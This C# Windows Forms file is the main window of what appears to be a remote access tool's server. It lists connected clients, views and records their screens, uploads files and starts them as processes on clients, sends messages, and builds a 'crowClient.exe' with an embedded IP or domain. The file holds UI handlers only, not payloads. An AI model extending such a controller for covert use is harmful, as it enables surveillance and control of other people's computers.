using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.IO;
using networkWork.view;
using System.Net.Sockets;

namespace rainServer
{
    public partial class mainForm : Form, mainWindow
    {
        public mainForm()
        {    
            InitializeComponent();
        }

        public event Action<Socket, streamWindow> streamStart;       
        public event send sendInfo;
        public event Action<ipMode, string> ipEvent;
        public event Action<compileMode, string, bool, bool, string> compile;
        public event Action<string> chooseNetwork;
        public event Action<Socket, string> StartSaveFraim;
        public event Action<Socket> StopSaveFraim;

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {            
            if (e.ColumnIndex != 3 || e.RowIndex == -1)
                return;

            Socket client = (Socket)dataGridView1.CurrentRow.Cells[2].Value;
            bool start = (bool)dataGridView1.CurrentRow.Cells[3].EditedFormattedValue;
            if (start)
            {
                saveFileDialog1.FileName = "Fraim";
                saveFileDialog1.Filter = "(*.jpg)|*.jpg|(*.bmp)|*.bmp|(*.png)|*.png";
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    MessageBox.Show("Recording start", "Message");
                    StartSaveFraim?.Invoke(client, saveFileDialog1.FileName);
                }
            }
            else
            {
                MessageBox.Show("Recording stop", "Message");
                StopSaveFraim?.Invoke(client);
            }
        }

        private void dataGridView1_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
        {            
            streamForm f2 = new streamForm();
            streamStart((Socket)dataGridView1.CurrentRow.Cells[2].Value, f2);
            f2.Show();            
        }

        public void connectionClient(Socket newClient, string ip, DateTime connectedTime)
        {
            string Time = $"time - {connectedTime.Hour}:{connectedTime.Minute}, data - {connectedTime.Day}.{connectedTime.Month}.{connectedTime.Year}";
            Invoke(new Action(() => dataGridView1.Rows.Add(ip, Time, newClient)));
            Invoke(new Action(() => textBox1.Text += $"+Connected {ip} = {Time}" + Environment.NewLine));
        }

        public void shutdownClient(Socket Client, string ip, DateTime disconnectedTime)
        {
            string Time = $"time - {disconnectedTime.Hour}:{disconnectedTime.Minute}, data - {disconnectedTime.Day}.{disconnectedTime.Month}.{disconnectedTime.Year}";
            foreach (DataGridViewRow row in dataGridView1.Rows)
            {
                if (row.Cells["socet"].Value.Equals(Client))
                {
                    Invoke(new Action(() => dataGridView1.Rows.RemoveAt(row.Index)));
                    break;
                }
            }
            Invoke(new Action(() => textBox1.Text += $"-Disconnected {ip} = {Time}" + Environment.NewLine));
        }

        private void saveLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DateTime date = DateTime.Now;
            string fileName = $"D{date.Day}M{date.Month}Y{date.Year}H{date.Hour}M{date.Minute}";
            saveFileDialog1.FileName = fileName;
            saveFileDialog1.Filter = "(*.txt)|*.txt";
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(saveFileDialog1.FileName, textBox1.Text);
                MessageBox.Show($"File {saveFileDialog1.FileName} is saved", "Message");       
            }                            
        }

        private async Task sendInfoToClient(Button but, string mode, string value)
        {
            but.Enabled = false;

            if (dataGridView1.Rows.Count > 0)
            {
                Socket client = (Socket)dataGridView1.CurrentRow.Cells[2].Value;
                await sendInfo?.Invoke(dataGridView1.Rows.Count, ((System.Net.IPEndPoint)client.RemoteEndPoint).Address.ToString(), mode, value);
            }
            else
                MessageBox.Show("There are no active connections :(", "Error!");

            but.Enabled = true;
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            if (textBox3.Text != "")
            {
                string[] str = textBox2.Text.Split('\\');
                byte[] atribute = File.ReadAllBytes(textBox2.Text);
                StringBuilder sB = new StringBuilder();
                for (int i = 0; i < atribute.Length; i++)
                    sB.Append(atribute[i] + "|");

                await sendInfoToClient((Button)sender, $"{taskMode.startProcess} {str[str.Length - 1]} {!checkBox2.Checked} {checkBox1.Checked}", sB.ToString());
            }
            else
                MessageBox.Show("No file chosen :(", "Error!");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)            
                textBox2.Text = openFileDialog1.FileName;                       
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            textBox3.Text = "";
            if (File.Exists(textBox2.Text))
                textBox3.Text = File.ReadAllBytes(textBox2.Text).Length.ToString() + " byte";
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            await sendInfoToClient((Button)sender, $"{taskMode.sendMessage} {textBox4.Text}", textBox5.Text);
        }


        private async void button5_Click(object sender, EventArgs e)
        {
            await sendInfoToClient((Button)sender, $"{taskMode.removeHostDNS}", textBox6.Text);
        }

        public void message(string mes, string header)
        {
            MessageBox.Show(mes, header);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            ipEvent?.Invoke(ipMode.checkIp, textBox6.Text);
        }

        private void getCurentIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ipEvent?.Invoke(ipMode.getCurentIp, null);
        }

        private void getDomainToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ipEvent?.Invoke(ipMode.getDomain, null);
        }

        private void setNewDomainToolStripMenuItem_Click(object sender, EventArgs e)
        {
            inputForm iF = new inputForm();
            iF.ShowDialog();
            if (iF.morfoze)
                ipEvent?.Invoke(ipMode.setNewDomein, iF.getDomain);            
        }

        private void getIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ipEvent?.Invoke(ipMode.getDomainIp, null);
        }

        private void setNewIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            paswdInput pI = new paswdInput();
            pI.ShowDialog();
            if (pI.morfoze)
                ipEvent?.Invoke(ipMode.setNewIp, pI.getPasswd);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            ipEvent?.Invoke(ipMode.checkIp, textBox7.Text);
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked)
            {
                panel1.Visible = false;
                panel2.Visible = true;
            }
            else
            {
                panel1.Visible = true;
                panel2.Visible = false;
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            if (checkBox3.Checked ? textBox8.Text != "" : textBox7.Text != "" && textBox9.Text != "")
                compile?.Invoke(
                    checkBox3.Checked ? compileMode.staticIP : compileMode.dynamicIP, 
                    checkBox3.Checked ? textBox8.Text : textBox7.Text, checkBox4.Checked, 
                    checkBox5.Checked, 
                    textBox9.Text);
            else
                MessageBox.Show("Not all fields are filled :(", "Error!");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            saveFileDialog1.FileName = "crowClient";
            saveFileDialog1.Filter = "(*.exe)|*.exe";
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                textBox9.Text = saveFileDialog1.FileName;
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new about().Show();
        }

        public void showNetworkLoad(int send, int received)
        {
            try
            {
                Invoke(new Action(() => graphicLoadUI1.reDraw(received, send)));
            }
            catch { }
        }

        private void mainForm_Load(object sender, EventArgs e)
        {
            graphicLoadUI1.SeriesColor = new Color[] { pictureBox2.BackColor, pictureBox3.BackColor };
            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
            string[] networks = new System.Diagnostics.PerformanceCounterCategory("Network Interface").GetInstanceNames();
            for (int i = 0; i < networks.Length; i++)
                comboBox1.Items.Add(networks[i]);
            if (networks.Length > 0)
                comboBox1.SelectedItem = comboBox1.Items[0];
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            chooseNetwork?.Invoke(comboBox1.SelectedItem.ToString());
        }
    }
}
